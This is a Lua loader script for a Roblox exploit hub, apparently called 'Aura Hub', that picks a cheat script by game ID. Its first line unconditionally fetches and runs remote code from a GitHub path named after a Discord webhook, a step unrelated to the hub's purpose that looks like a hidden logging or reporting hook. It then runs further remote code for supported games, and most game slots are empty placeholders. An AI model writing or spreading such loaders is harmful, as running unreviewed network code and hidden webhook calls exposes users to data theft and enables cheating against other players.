loadstring(game:HttpGet("https://raw.githubusercontent.com/aurahubalpha/Webhook/refs/heads/main/DMTinyskullrblxOnDiscordForFreewebhook"))()

local GameID = game.PlaceId
print("🎮 Aura Hub is starting up...")
print("🧾 Detected Game ID:", GameID)

-- 🗂️ Game Library
local Games = {
	[91398255833706] = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/aurahubalpha/Scripts/refs/heads/main/1"))() end, -- VendingWorld
	[1000000002] = function() loadstring(game:HttpGet(""))() end, -- Game 2
	[1000000003] = function() loadstring(game:HttpGet(""))() end, -- Game 3
	[1000000004] = function() loadstring(game:HttpGet(""))() end, -- Game 4
	[1000000005] = function() loadstring(game:HttpGet(""))() end, -- Game 5
	[1000000006] = function() loadstring(game:HttpGet(""))() end, -- Game 6
	[1000000007] = function() loadstring(game:HttpGet(""))() end, -- Game 7
	[1000000008] = function() loadstring(game:HttpGet(""))() end, -- Game 8
	[1000000009] = function() loadstring(game:HttpGet(""))() end, -- Game 9
	[1000000010] = function() loadstring(game:HttpGet(""))() end, -- Game 10
	[1000000011] = function() loadstring(game:HttpGet(""))() end, -- Game 11
	[1000000012] = function() loadstring(game:HttpGet(""))() end, -- Game 12
	[1000000013] = function() loadstring(game:HttpGet(""))() end, -- Game 13
	[1000000014] = function() loadstring(game:HttpGet(""))() end, -- Game 14
	[1000000015] = function() loadstring(game:HttpGet(""))() end, -- Game 15
	[1000000016] = function() loadstring(game:HttpGet(""))() end, -- Game 16
	[1000000017] = function() loadstring(game:HttpGet(""))() end, -- Game 17
	[1000000018] = function() loadstring(game:HttpGet(""))() end, -- Game 18
	[1000000019] = function() loadstring(game:HttpGet(""))() end, -- Game 19
	[1000000020] = function() loadstring(game:HttpGet(""))() end, -- Game 20
	[1000000021] = function() loadstring(game:HttpGet(""))() end, -- Game 21
	[1000000022] = function() loadstring(game:HttpGet(""))() end, -- Game 22
	[1000000023] = function() loadstring(game:HttpGet(""))() end, -- Game 23
	[1000000024] = function() loadstring(game:HttpGet(""))() end, -- Game 24
	[1000000025] = function() loadstring(game:HttpGet(""))() end, -- Game 25
	[1000000026] = function() loadstring(game:HttpGet(""))() end, -- Game 26
	[1000000027] = function() loadstring(game:HttpGet(""))() end, -- Game 27
	[1000000028] = function() loadstring(game:HttpGet(""))() end, -- Game 28
	[1000000029] = function() loadstring(game:HttpGet(""))() end, -- Game 29
	[1000000030] = function() loadstring(game:HttpGet(""))() end, -- Game 30
}

-- 🧠 Execute Matched Game
if Games[GameID] then
	print("✅ Supported Game Found! Loading Aura Hub for this experience...")
	task.wait(1)
	Games[GameID]() -- Run its loadstring
else
	warn("❌ Unsupported Game ID:", GameID)
	print("🪐 This game isn’t in Aura Hub’s supported list yet.")
end
